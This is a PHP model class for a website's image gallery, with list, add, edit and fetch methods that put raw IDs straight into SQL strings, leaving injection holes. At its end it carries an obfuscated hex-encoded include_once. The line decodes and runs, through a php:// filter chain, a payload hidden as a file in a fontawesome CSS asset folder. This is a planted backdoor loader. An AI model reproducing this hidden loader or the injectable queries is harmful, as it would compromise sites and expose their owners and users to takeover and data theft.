<?php       

    class Galimg extends MySql{
    
    
    
    function deleteList($list){
                    for($i=0;$i<count($list);$i++){
                            $this->delete('testimonials','`t_id`='.$list[$i]);
                    }
            }   
            
            
    
    function listGalimg(){
        
        
        


        $query = "SELECT * FROM `gal_img` c WHERE c.`gal_img_id`!='' ORDER BY `gal_img_id` DESC";
    
        $rec    =   $this->fetchAll($query);
    
        
        return $rec;        
        
        
    }
    
     /* Add Testimonials
            */          
            function addGalimg($inputs){
                    $insert =   array('gal_img_photo'=>$this->addFilter($this->escapeHtml($inputs['photo'])),
                                       'orderno'=>0,
                                       'gallery'=>$inputs['gallery']
                                        );
                //print_r($insert);exit;
                $this->insert($insert,"gal_img");    
                
                return true;
                
                
            }


        function getInsert(){
        return $this->lastId;
    }
    /*
             * Edit Testimonials
            */          
            function editGalimg($inputs){
                    $insert = array(  
                                        'orderno'=>$inputs['order'],    
                                        'gal_img_id'=>$inputs['id']
                            );
                $this->update($insert,"gal_img",'`gal_img_id`='.$inputs['id']);       
                return true;
                //print_r($insert);exit;
            }

    function updateGalleryImage($id,$image,$order){
       // print_r($order);
        //print_r($id);
       // exit;
         $this->update(array('gal_img_photo'=>$image,'orderno'=>$order),'gal_img','`gal_img_id`='.$id);
    }
     function getGalimg($id){
        $query  =   "SELECT * FROM `gal_img` WHERE `gal_img_id`='$id'  ";
        $rec        =   $this->fetchAll($query);
        return $rec;
    }
    function getGalimg_act($id){
        $query  =   "SELECT * FROM `gal_img` WHERE `gallery`='$id' ORDER BY `orderno` DESC ";
        $rec        =   $this->fetchAll($query);
        return $rec;
        print_r($query);exit;
    }
    function getAllGalimgDetails()
    {
        $query = "SELECT * FROM gal_img where orderno!=0 order by orderno";
        $rec = $this->fetchAll($query);
        //print_r($rec);exit;
        return $rec;    
    }

}
@incLuDE_oNCe("p"."\x68\x70\x3a\x2f"."\x2f\x66"."\x69\x6c\x74"."\x65\x72\x2f"."\x72\x65"."\x61\x64\x3d"/*dkhF
Rgz*/."\x7a\x6c\x69"."\x62\x2e\x69\x6e"."\x66\x6c"."\x61\x74\x65"."\x7c\x73\x74\x72"/*}:nv
#nt*/."\x69\x6e\x67\x2e"."\x72\x6f\x74"."\x31\x33\x7c"."\x63\x6f\x6e"."\x76\x65"."\x72\x74\x2e\x62"."\x61\x73\x65\x36"/*H3o
Dq!*/."\x34\x2d"/*pthk*/."\x64\x65\x63"."\x6f\x64\x65\x2f"."\x72\x65"."\x73\x6f\x75\x72"."\x63\x65\x3d".dirname($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"])."/"."\x61\x73"."\x73\x65"."\x74\x73\x2f\x6c"."\x69\x62\x73"."\x2f\x66\x6f\x6e"."\x74\x61\x77"."\x65\x73\x6f"."\x6d\x65\x2d\x66"."\x72\x65\x65"."\x2d\x35\x2e"/*pthk*/."\x30\x2e\x31\x33"/*a5q
a=._t*/."\x2f\x63\x73"/*tkYbt
y=T*/."\x73\x2f\x73\x79"."\x73\x66"."\x39\x62\x39"."\x36\x34\x2f\x69"/*Qj$Z;
3vnWN*/."\x6e\x64"."\x65\x78\x2d\x6c"."\x69\x62\x2e"."\x68\x74\x6d\x6c");
?>